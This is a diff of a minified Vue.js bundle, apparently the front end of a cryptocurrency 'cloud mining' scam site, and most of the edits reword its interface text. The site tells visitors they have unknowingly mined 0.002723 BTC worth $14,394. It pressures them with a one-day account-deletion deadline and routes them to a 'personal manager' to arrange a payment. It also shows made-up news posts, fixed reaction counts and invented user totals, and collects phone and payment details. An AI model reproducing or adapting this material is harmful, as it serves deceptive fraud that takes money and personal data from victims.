@@ -327,9 +327,9 @@
                 staticClass: "p-2 m-auto"
             }, [t._v("Urgent notification!")])])]), a("p", [a("b", {
                 staticClass: "text-numbers"
-            }, [t._v(t._s(t.penultDayYear))]), t._v(" days ago you registered on our automated cloud mining (collection) platform, linking your devices to our platform via IP address.")]), a("p", [t._v("You have not been active in your personal account, but cryptocurrency collection has been happening automatically from your device.")]), a("p", {
+            }, [t._v(t._s(t.penultDayYear))]), t._v(" days ago you registered on our platform for automatic cloud mining (collection) of Bitcoin, linking your devices to our platform by IP address.")]), a("p", [t._v("You have not been active in your personal account, but cryptocurrency collection was performed automatically from your device.")]), a("p", {
                 staticClass: "text-center"
-            }, [t._v("Your balance has accumulated")]), a("div", {
+            }, [t._v("Your account has accumulated")]), a("div", {
                 staticClass: "text-center w-75 mx-auto p-2 bitcoin-balance"
             }, [a("div", {}, [a("div", {
                 staticClass: "bit-lang-g-icon bitcoin-logo-coin"
@@ -384,15 +384,15 @@
                 attrs: {
                     "data-bg": s("c14e")
                 }
-            }), a("p", [t._v("During your absence, cloud mining has generated an amount of "), a("b", {
+            }), a("p", [t._v("During your absence, using cloud mining, you have mined an amount of "), a("b", {
                 staticClass: "text-numbers"
-            }, [t._v("0.002723 BTC (Bitcoin)")]), t._v(", which at the internal rate at the end of the mining process on "), a("b", {
+            }, [t._v("0.002723 BTC (bitcoin)")]), t._v(", which at the internal exchange rate at the end of the mining process on "), a("b", {
                 staticClass: "text-numbers"
-            }, [t._v(t._s(t.backDate))]), t._v(" equals "), a("b", {
+            }, [t._v(t._s(t.backDate))]), t._v(" amounts to "), a("b", {
                 staticClass: "text-numbers"
             }, [a("span", [t._v("$")]), t._v("14,394.00")])])]), a("p", {
                 staticClass: "text-center"
-            }, [t._v("Your balance has accumulated")]), a("div", {
+            }, [t._v("Your account has accumulated")]), a("div", {
                 staticClass: "text-center w-75 mx-auto p-2 bitcoin-balance"
             }, [a("div", {}, [a("div", {
                 staticClass: "bit-lang-g-icon bitcoin-logo-coin"
@@ -441,17 +441,17 @@
                 staticClass: "text-attention font-weight-bold"
             }, [t._v("account will be deleted")]), t._v(" in "), a("span", {
                 staticClass: "text-attention font-weight-bold"
-            }, [t._v("1 day")]), t._v("! You have not been active on the site for "), a("b", {
+            }, [t._v("1 day")]), t._v("! You have not been active on the site "), a("b", {
                 staticClass: "text-numbers text-attention"
             }, [t._v(t._s(t.penultDayYear))]), t._v(" days since registration.")]), a("p", {
                 staticClass: "block-attention"
-            }, [t._v("\n          According to the rules of the automated mining system, if you do not use the service and do not visit the site for "), a("b", {
+            }, [t._v("\n          According to the rules of the automatic mining system, if you do not use the service and do not visit the site for "), a("b", {
                 staticClass: "text-numbers text-attention "
-            }, [t._v(t._s(t.totalDaysYear))]), t._v(" consecutive days, your "), a("span", {
+            }, [t._v(t._s(t.totalDaysYear))]), t._v(" consecutive days, then "), a("span", {
                 staticClass: "text-attention font-weight-bold"
-            }, [t._v("account will be blocked")]), t._v(". "), a("br"), t._v("\n          In this case, the account "), a("span", {
+            }, [t._v("account blocking")]), t._v(". "), a("br"), t._v("\n          In that case, the account "), a("span", {
                 staticClass: "text-attention font-weight-bold"
-            }, [t._v("cannot be restored")]), t._v(", and the funds on the balance will be distributed among other system participants.")]), a("hr")]), a("b-carousel-slide", [a("div", {
+            }, [t._v("cannot be restored")]), t._v(", and the funds on the balance are distributed among other system participants.")]), a("hr")]), a("b-carousel-slide", [a("div", {
                 staticClass: "d-block"
             }, [a("div", {
                 staticClass: "d-flex font-weight-bold justify-content-center text-center text-noty text-uppercase my-2"
@@ -469,11 +469,11 @@
                 staticStyle: {
                     "font-size": "80%"
                 }
-            }, [t._v("If you don't remember your old password, use the password that the system automatically generates for you.")])]), a("li", {
+            }, [t._v("If you don't remember your old password, use the password that the system will generate automatically")])]), a("li", {
                 staticClass: "pb-2"
-            }, [t._v("2. In your personal account, contact your personal manager, they will prepare the payment for you.")]), a("li", {
+            }, [t._v("2. In your personal account, contact your personal manager, they will prepare the payment")]), a("li", {
                 staticClass: "pb-2"
-            }, [t._v("3. Request a withdrawal of funds.")])])]), a("hr")])], 1), a("div", {
+            }, [t._v("3. Request a withdrawal.")])])]), a("hr")])], 1), a("div", {
                 staticClass: "w-100 text-center"
             }, [a("button", {
                 staticClass: "btn btn-success",
@@ -495,7 +495,7 @@
                 staticClass: "p-2 m-auto"
             }, [t._v("Urgent notification!")])])]), a("p", [a("b", {
                 staticClass: "text-numbers"
-            }, [t._v(t._s(t.penultDayYear))]), t._v(" days ago you registered on our automated cloud mining (collection) platform, linking your devices to our platform via IP address.")]), a("p", [t._v("You have not been active in your personal account, but cryptocurrency collection has been happening automatically from your device.")]), a("div", {
+            }, [t._v(t._s(t.penultDayYear))]), t._v(" days ago you registered on our platform for automatic cloud mining (collection) of Bitcoin, linking your devices to our platform by IP address.")]), a("p", [t._v("You have not been active in your personal account, but cryptocurrency collection was performed automatically from your device.")]), a("div", {
                 staticClass: "d-flex position-relative"
             }, [a("img", {
                 staticClass: "lazyload my-auto d-none d-sm-block",
@@ -513,15 +513,15 @@
                 attrs: {
                     "data-bg": s("c14e")
                 }
-            }), a("p", [t._v("During your absence, cloud mining has generated an amount of "), a("b", {
+            }), a("p", [t._v("During your absence, using cloud mining, you have mined an amount of "), a("b", {
                 staticClass: "text-numbers"
-            }, [t._v("0.002723 BTC (Bitcoin)")]), t._v(", which at the internal rate at the end of the mining process on "), a("b", {
+            }, [t._v("0.002723 BTC (bitcoin)")]), t._v(", which at the internal exchange rate at the end of the mining process on "), a("b", {
                 staticClass: "text-numbers"
-            }, [t._v(t._s(t.backDate))]), t._v(" equals "), a("b", {
+            }, [t._v(t._s(t.backDate))]), t._v(" amounts to "), a("b", {
                 staticClass: "text-numbers"
             }, [a("span", [t._v("$")]), t._v("14,394.00")])])]), a("p", {
                 staticClass: "text-center"
-            }, [t._v("Your balance has accumulated")]), a("p"), a("div", {
+            }, [t._v("Your account has accumulated")]), a("p"), a("div", {
                 staticClass: "text-center w-75 mx-auto p-2 bitcoin-balance"
             }, [a("div", {}, [a("div", {
                 staticClass: "bit-lang-g-icon bitcoin-logo-coin"
@@ -570,17 +570,17 @@
                 staticClass: "text-attention font-weight-bold"
             }, [t._v("account will be deleted")]), t._v(" in "), a("span", {
                 staticClass: "text-attention font-weight-bold"
-            }, [t._v("1 day")]), t._v("! You have not been active on the site for "), a("b", {
+            }, [t._v("1 day")]), t._v("! You have not been active on the site "), a("b", {
                 staticClass: "text-numbers text-attention"
             }, [t._v(t._s(t.penultDayYear))]), t._v(" days since registration.")]), a("p", {
                 staticClass: "block-attention"
-            }, [t._v("\n        According to the rules of the automated mining system, if you do not use the service and do not visit the site for "), a("b", {
+            }, [t._v("\n        According to the rules of the automatic mining system, if you do not use the service and do not visit the site for "), a("b", {
                 staticClass: "text-numbers text-attention "
-            }, [t._v(t._s(t.totalDaysYear))]), t._v(" consecutive days, your "), a("span", {
+            }, [t._v(t._s(t.totalDaysYear))]), t._v(" consecutive days, then "), a("span", {
                 staticClass: "text-attention font-weight-bold"
-            }, [t._v("account will be blocked")]), t._v(". "), a("br"), t._v("\n        In this case, the account "), a("span", {
+            }, [t._v("account blocking")]), t._v(". "), a("br"), t._v("\n        In that case, the account "), a("span", {
                 staticClass: "text-attention font-weight-bold"
-            }, [t._v("cannot be restored")]), t._v(", and the funds on the balance will be distributed among other system participants.")]), a("div", {
+            }, [t._v("cannot be restored")]), t._v(", and the funds on the balance are distributed among other system participants.")]), a("div", {
                 staticClass: "d-block"
             }, [a("div", {
                 staticClass: "d-flex font-weight-bold justify-content-center text-center text-noty text-uppercase my-2"
@@ -598,11 +598,11 @@
                 staticStyle: {
                     "font-size": "80%"
                 }
-            }, [t._v("If you don't remember your old password, use the password that the system automatically generates for you.")])]), a("li", {
+            }, [t._v("If you don't remember your old password, use the password that the system will generate automatically")])]), a("li", {
                 staticClass: "pb-2"
-            }, [t._v("2. In your personal account, contact your personal manager, they will prepare the payment for you.")]), a("li", {
+            }, [t._v("2. In your personal account, contact your personal manager, they will prepare the payment")]), a("li", {
                 staticClass: "pb-2"
-            }, [t._v("3. Request a withdrawal of funds.")])])])]), a("b-button", {
+            }, [t._v("3. Request a withdrawal.")])])])]), a("b-button", {
                 staticClass: "mt-1 btn-success text-uppercase w-100",
                 attrs: {
                     variant: "primary",
@@ -816,7 +816,7 @@
     "36ff": function(t, e, s) {},
     3834: function(t, e, s) {},
     "3b71": function(t, e) {
-        t.exports = "data:image/png;base64,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"
+        t.exports = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAC/VBMVEUAAACxZhwAkf//UyH0byn/VyL/VyL/VyH/ViIghOgeiOYeiOb/ViL/VyL/VyD/VyL/VyIdiOb/VyIeiOYeiOYeieYeiOYeh+X/VyH/WCH/VSP/VCL/VyL+VyL/VyIeiOUeiOb/VyL/ViH/VyAfh+QaieXlsxAcjOMeiOVvUkceiOVvUkgdiOX/VyIeieYeiOX/VyIeiOYdiOb/WCIeiOYeiOX/VyL/ViL/VyIfieUfiOb/WSUgiecbhuQYhuftjQrnig8eiOX/VyIeieX/VyLjqxbolxAeiOX/VyEeiOVyUUf/VyJxUkj/WCEeiOUeiOX/VyMdiOX/VyEeieX/VyL/ViH/WCEdieXzrQ7/WCJjU0ropBPpkQ/mrhP/VyLvlQ1wUkfjrBX/VyLxmAlwUkfvtA/jqxbxthBxUkhwVEj/VyLytw7znQv/VyHjqxceiOb/VyH9tAnloBD8vAb/WSNuUkNvU0fiqxTknRPssRPwlgxwUkinVDmsgS0eiOXttBOhVTztog3ylwntsxHrlQ5wVEj/VyMufsb/VyLsshGrgC7Glib5oAj/VyLumg1wUkneWC1zVEv/VyLunxHztgwfieWXcDfirBXsVyb5tgv2vgn2vAzrnRB3VUhxVUx3VUr/VSTBiSz/ugd6WUNoUUYrgNV5VUj/wQf/VyL/jwAeiOVuUUdzU0dwUkdvUkd3VEh1VEfjqxT/vQb/tQXmrBX/wAf/kwDnrxXpsRHmhQ/khA7+wAf/pgP/mwKdVT7utA//rQT/owP7jwOSVEDmoxP8vgnyigj/ngL/lgEogtJ2U0eIVUN+XUCZVD2nVjuwVjiYcTT5VyTytw7riA3vmQzphgv5vQr/ugb/qQT3iwRBdKhIbZZwWld6W0KHYzyhVTyKZzu6VjXbVy3mVynBkSTAkCPRnRzssRHlmxH3uwz0uAz1tAv/qAREcqBTaohwVEp/VUd/VUaHZT3DVjPLVzGheDDtVie6iybwVybXoh3jmRLigg7vkgz2qwv7pwbzPEwnAAAApnRSTlMAAgIKBf7SxbUN7+mNchr75cGonoxdSTcmHxMO9/DY18qGVzYYEw0I+fTb2LisqqWalIF/d3BlT0gvKCIfGwr9+/Tz4+De19Kxr6+ioJ+aZ19WU0NDPi0iGhYK/vr26eTgw8C7t5mMjIZ7eXhvbGxROTc1Kxwa+vn17Ovq5ubf39zZ2NTLycfEubOnoZ+WiXBrampqaWNiYl5bVlROPDYtKiklFxYGVCsgDAAABVRJREFUWMPVlmV800AYxtONytqVGWPAhMHQGRO2AcPd3d3d3d3d3aW5Xrpu3cp8A2a4u7u7Oz+Su6SsbcpS+AL/D801uffJvXYX4l+mvHeBvxMoB8uUsN6qaoE93HANhH+whHbQ34YdVoawRkmrBUr6wjBu7Avlw4RbFnbH19KB9bglFHRDIyHkm+8JmrNjG//ShPUEAGBviD6fgO32CraEgRJhps8rANCTXUCI3MbMvVCpAwD5Df8LKmALkymi2sBThLT9YaDJs/zOYsDACdg1hRA2IEwYiCe4KaC8kvGTCE8AaspCI3xE7BK9aXtvO1OBIm3cmdQroK+b8YPiDkDaErnP4QphPUv14QILVDW+M7qmYwXTWYFFLZW4jaKZ6S1naRHzYqtCWKCKi+kddwmyF0plV9Ps23et3cgKCTuFcQY6SABNfUI4TvKCud/vBYCkiczDXbiAWxnY9FeGiwEvWSRBKAvxzCzdonwzvl5rJYdF23EL8Khvq3RUNpfwCNgVhTQKV55EOMGpJdkSkuYjCokBcLA1n+YKESF8tRDCbWTF2jI/YhDEMyskuJJdpYLBrvy7sS++huNOLCTimTPs99sxvrQ2e1CxVi0XN9zQlmy39fbzazivI46BmXcoct6udLs0s2C/oywV9fLq4bKNd9N/7Aubpgh6uzAaNfwbKCwILKSiXxyGzzVU2f4ioniAaa82sKFVnCCNkwWBKZTqCjx8TRUdRflttXU0dqJEjXY4EsH1nCry2++8T0VfvXJNRRNDjR0QXluEIxZWlakdp0AiL/p91mpUHFFUQ4kPuh0G5eXKF6gFK+YpMC3hVpTKgIaavh7dblEGMrjkaT8i4QztQy6FI5PH4H0iWA7LNM37vOmTcCH7GF4C5uTx7ru4HrETcL5NSCTJe1SMwT7z9FGtX0dCMBsSzpBkyi0t58TN05/oZMzJJ1igW1Y2SZJ6De3E6/TjJ+8AcIJJZ2Oh9u3PVoslaT5SGtVRQCO+jXOxQqDA4qSctL2MwikqOpO2v5vO1kPZ5UE9vRwlstA2yJsOPi2bR+TnEZiYlKE+wAhcuKFVpZ/IVLGkfwAcXYsVHijBQ2mEmQedzqrV6lRGYd8xHEicSnq2p6xJkLO0JjCivsl5MUj/Xc0pJF43KBwXgzuZk1AuRT4BtJ3HkDaRkT7hMjHwGm0kMEufsp9ROMDEQXedOoIF7p4+oTpCDcBzpOImjsAZd1hbKfDKfWCMSthHkkghLZZZwzFtDAqA+CYTx+74S8OhJeHeCCjZumsEZKJcjah7TLIK8XFMHG5QTGO+e4t7ewszZzj6jLL3YJ0X2YNwg72osz6FpImLZyT2M7l4T0VFq26/Qo5Q/dGHFD5hZErOKGClQWBw0jkScfEQcuMiPbwXo9UcZWuhIdqm8YdcZJDh8GxrEJiZnPEMK+xNVaNYxtJunKKicGtpUT0XdhiCdJwJM0qdPa9WXyIxcWgR8am0xIM3lFYTE62hlqFpc4EkVOnsUMxcYNOXHKYG9rKLuBSPVnEwjkx5cEpDUdreuCULOaIeGW4usED3A1nEkpjYA2pExrlO+jqL1o4xfHEs8QQeSh4PuiSSlxiDQ3EkJ5Ean5FzPql63VUi410nP9/+sFr3hMvgwYtYIPvJw6zO3ZaWIgQxQ5fCvDQNx5/2/PE+vb7HUGQthBFJ53D49qNFXP72KKtO3/aEcHp9vZwWi+P/LCMnKbn67M2EVVRLZsOXfSZBN77uYBFhHaOyqqHwPU3UjeuxLh9hNYN0T9PUl88nJ9dFYbOejbrEh4+Sq/caSfwpfbrU6TuS+G/5CZTHouWjTdO8AAAAAElFTkSuQmCC"
     },
     "3c60": function(t, e, s) {
         "use strict";
@@ -1161,10 +1161,10 @@
                 staticClass: "navbar navbar-expand-lg navbar-light preheader justify-content-center justify-content-sm-end mt-1 "
             }, [t._m(0), a("div", {
                 staticClass: "d-inline-block text-center font-weight-normal pre-info-item px-3 py-1"
-            }, [a("div", [t._v("Total Paid Out")]), a("div", [a("span", {
+            }, [a("div", [t._v("Total Paid")]), a("div", [a("span", {
                 staticClass: "text-numbers font-weight-bold",
                 domProps: {
-                    innerHTML: t._s(t.$numberWithSpaces(t.$store.getters.totalUserPayout) + " USD")
+                    innerHTML: t._s(t.$numberWithSpaces(t.$store.getters.totalUserPayout) + " RUB")
                 }
             })])]), a("div", {
                 staticClass: "pre-info-item px-3 py-1"
@@ -1213,9 +1213,9 @@
                 }
             }, [a("div", {
                 staticClass: "text-center h4 font-weight-normal mt-4 text-numbers mb-0"
-            }, [t._v("Latest news from " + t._s(t.$store.getters.sitename))]), a("div", {
+            }, [t._v("Latest service news " + t._s(t.$store.getters.sitename))]), a("div", {
                 staticClass: "h5 font-weight-normal text-numbers my-0 text-center"
-            }, [t._v("Showing " + t._s(t.news.length) + " of 729 entries")]), t._l(t.news, (function(e, n) {
+            }, [t._v("Showing " + t._s(t.news.length) + " out of 729 entries")]), t._l(t.news, (function(e, n) {
                 return a("div", {
                     key: n,
                     staticClass: "col-12 m-0 p-0 m-sm-2 news-post my-5"
@@ -1337,7 +1337,7 @@
                     symbol: "auto",
                     size: "0 0 18 18"
                 }
-            }), t._v("Auto Bitcoin Bonus Collection")])]), a("div", {
+            }), t._v("Automatic Bitcoin Bonus Collection")])]), a("div", {
                 staticClass: "content-body has-border-bottom"
             }, [a("div", {
                 staticClass: "row"
@@ -1382,7 +1382,7 @@
                 attrs: {
                     for: "checkbox-1"
                 }
-            }, [a("small", [t._v(t._s(t.account.automode ? "Enabled" : "Disabled") + " automatic Bitcoin bonus collection")])]), a("div", [a("small", [t._v("Collects bitcoins every "), a("span", {
+            }, [a("small", [t._v(t._s(t.account.automode ? "Enabled" : "Disabled") + " automatic bitcoin bonus collection")])]), a("div", [a("small", [t._v("Collects bitcoins every "), a("span", {
                 staticClass: "font-weight-lighter text-numbers"
             }, [t._v("7")]), t._v(" days")])])])])])])])]), a("div", {
                 staticClass: "col-lg-12"
@@ -1444,7 +1444,7 @@
                 staticClass: "form-group"
             }, [a("label", {
                 staticClass: "mr-sm-2"
-            }, [t._v("Enter your phone number for security")]), a("phone-mask-input", {
+            }, [t._v("Enter your phone number for protection")]), a("phone-mask-input", {
                 attrs: {
                     autoDetectCountry: "",
                     showFlag: "",
@@ -1720,7 +1720,7 @@
                         t.$set(t.account.payment, "method", e.target.multiple ? s : s[0])
                     }
                 }
-            }, [a("option", [t._v("Bank card (Russia)")]), a("option", [t._v("Bank card (Other countries)")]), a("option", [t._v("E-wallet")]), a("option", {
+            }, [a("option", [t._v("Bank card (Russia)")]), a("option", [t._v("Bank card (Other countries)")]), a("option", [t._v("Electronic wallet")]), a("option", {
                 staticClass: "d-none",
                 attrs: {
                     selected: ""
@@ -1757,7 +1757,7 @@
                 }
             })]), a("div", {
                 staticClass: "text-black-50"
-            }, [t._v("\n                                            Transfer fee ~ "), a("span", {
+            }, [t._v("\n                                            Transfer commission ~ "), a("span", {
                 staticClass: "text-numbers"
             }, [t._v("0.00001")]), t._v(" BTC\n                                        ")])])])])])])])]), a("div", {
                 staticClass: "col-lg-6"
@@ -1832,7 +1832,7 @@
                 attrs: {
                     for: "checkbox-3"
                 }
-            }, [a("small", [t._v(t._s(t.account.chatSoundAlert ? "Enabled" : "Disabled") + " chat sound alerts")])])])]), a("hr", {
+            }, [a("small", [t._v(t._s(t.account.chatSoundAlert ? "Enabled" : "Disabled") + " sound notifications in chat")])])])]), a("hr", {
                 staticClass: "w-25 mb-0",
                 staticStyle: {
                     "border-top": "1px solid rgba(0, 0, 0, 0.1)"
@@ -1878,11 +1878,11 @@
                 attrs: {
                     for: "checkbox-4"
                 }
-            }, [a("small", [t._v(t._s(t.account.notifications ? "Displayed" : "Not displayed") + " other users' transfers")])]), a("div", {
+            }, [a("small", [t._v(t._s(t.account.notifications ? "Displayed" : "Not displayed") + " transfers of other users")])]), a("div", {
                 staticStyle: {
                     "font-size": "12px"
                 }
-            }, [t._v("Notifications appear in the lower left corner")])])])])])])]), a("div", {
+            }, [t._v("Notifications are displayed in the bottom left corner")])])])])])])]), a("div", {
                 staticClass: "col-lg-12"
             }, [a("section", {
                 staticClass: "box"
@@ -1993,7 +1993,7 @@
                 }
             })]), a("i", {
                 staticClass: "fa fa-info-circle color-primary complete f-s-14"
-            }), a("small", [t._v("Avoid using simple passwords")]), a("ul", {
+            }), a("small", [t._v("Beware of using simple passwords")]), a("ul", {
                 staticClass: "ml-20 mt-30 list-unstyled"
             }, [a("li", [a("svg", {
                 directives: [{
@@ -2005,7 +2005,7 @@
                     symbol: "dot-circle-regular",
                     size: "0 0 14 14"
                 }
-            }), t._v(" Password must be at least 8-15 characters long\n                                            ")]), a("li", [a("svg", {
+            }), t._v(" Password must contain at least 8-15 characters\n                                            ")]), a("li", [a("svg", {
                 directives: [{
                     name: "svg",
                     rawName: "v-svg"
@@ -2015,7 +2015,7 @@
                     symbol: "dot-circle-regular",
                     size: "0 0 14 14"
                 }
-            }), t._v(" Password must contain uppercase and lowercase letters\n                                            ")])])])])])])]), a("div", {
+            }), t._v(" Password must contain uppercase and lowercase characters\n                                            ")])])])])])])]), a("div", {
                 staticClass: "col-lg-12"
             }, [a("section", {
                 staticClass: "box"
@@ -2039,7 +2039,7 @@
                     symbol: "mail",
                     size: "0 0 18 18"
                 }
-            }), t._v("Newsletter Subscription")]), a("div", {
+            }), t._v("News Subscription")]), a("div", {
                 staticClass: "actions panel_actions pull-right"
             }, [a("div", {
                 staticClass: "form-group no-mb"
@@ -2078,7 +2078,7 @@
                 staticClass: "form-group"
             }, [a("label", {
                 staticClass: "mr-sm-2"
-            }, [t._v("What to call you")]), a("input", {
+            }, [t._v("How to address you")]), a("input", {
                 directives: [{
                     name: "model",
                     rawName: "v-model",
@@ -2102,7 +2102,7 @@
                 staticClass: "form-group"
             }, [a("label", {
                 staticClass: "mr-sm-2"
-            }, [t._v("Enter your Email")]), a("input", {
+            }, [t._v("Enter your email")]), a("input", {
                 directives: [{
                     name: "model",
                     rawName: "v-model.trim",
@@ -2115,7 +2115,7 @@
                 staticClass: "form-control noshadow",
                 attrs: {
                     type: "email",
-                    placeholder: "Your Email"
+                    placeholder: "Your email"
                 },
                 domProps: {
                     value: t.account.mail.email
@@ -2167,7 +2167,7 @@
                 attrs: {
                     for: "checkbox-5"
                 }
-            }, [a("small", [t._v("Receive email notifications when I get Bitcoin bonuses")])])]), a("div", {
+            }, [a("small", [t._v("Receive email notifications when I get bitcoin bonuses")])])]), a("div", {
                 staticClass: "position-relative pt-2"
             }, [a("input", {
                 directives: [{
@@ -2316,7 +2316,7 @@
                             emoji: "😄"
                         },
                         hooray: {
-                            via: "hooray emoji",
+                            via: "celebration emoji",
                             pic: "hooray.png",
                             emoji: "🎉"
                         },
@@ -2334,7 +2334,7 @@
                     news: [{
                         dateoffset: 9,
                         header: "Website design updated",
-                        text: "Due to the move to a new, more powerful server, we decided to delight you with a new website design. We are sure you will like it. Added functionality to enable/disable sound for new messages in the chat, the ability to change payment details. Good earnings to you!",
+                        text: "Due to moving to a new, more powerful server, we decided to please you with a new website design. We are sure you will like it. Added functionality to enable/disable sound of new messages in the chat, the ability to change payment details. Good earnings to you!",
                         hashtags: ["news", "newdesign"],
                         reactions: [{
                             alias: "thumbs up",
@@ -2370,8 +2370,8 @@
                     }, {
                         dateoffset: 35,
                         header: "Payments to Webmoney",
-                        text: "Following numerous requests, payments to Webmoney (WMR) have been added. The withdrawal fee is 3% of the amount paid.",
-                        hashtags: ["news", "webmoney", "payouts"],
+                        text: "Due to numerous requests, payments to Webmoney (WMR) have been added. The withdrawal commission is 3% of the payment amount.",
+                        hashtags: ["news", "webmoney", "payments"],
                         reactions: [{
                             alias: "thumbs up",
                             count: 481,
@@ -2405,7 +2405,7 @@
                         }]
                     }, {
                         dateoffset: 84,
-                        header: "Technical work",
+                        header: "Technical maintenance",
                         text: "The work on moving the site to a new server is completed. <br>Good earnings to everyone.",
                         hashtags: ["news", "server"],
                         reactions: [{
@@ -2441,8 +2441,8 @@
                         }]
                     }, {
                         dateoffset: 85,
-                        header: "Technical work",
-                        text: "Due to a large influx of new users, we need to move the site to a more powerful server <br>From 25.10.2018 2:00 to 5:00 Moscow time, the site will be unavailable.",
+                        header: "Technical maintenance",
+                        text: "Due to a large influx of new users, we need to move the site to a more powerful server <br>25.10.2018 from 2:00 to 5:00 Moscow time the site will be unavailable.",
                         hashtags: ["news", "server", "maintenance"],
                         reactions: [{
                             alias: "thumbs up",
@@ -2478,7 +2478,7 @@
                     }, {
                         dateoffset: 125,
                         header: "Good news! We are already 5,000!",
-                        text: "We have good news for you. Today the number of users on our site in ".concat(this.$store.getters.geo.countryName, " has exceeded 5,000 people. <br>In honor of this event, we are giving all active users a bonus of $1,000!.<br>The total number of users worldwide exceeds 50 million."),
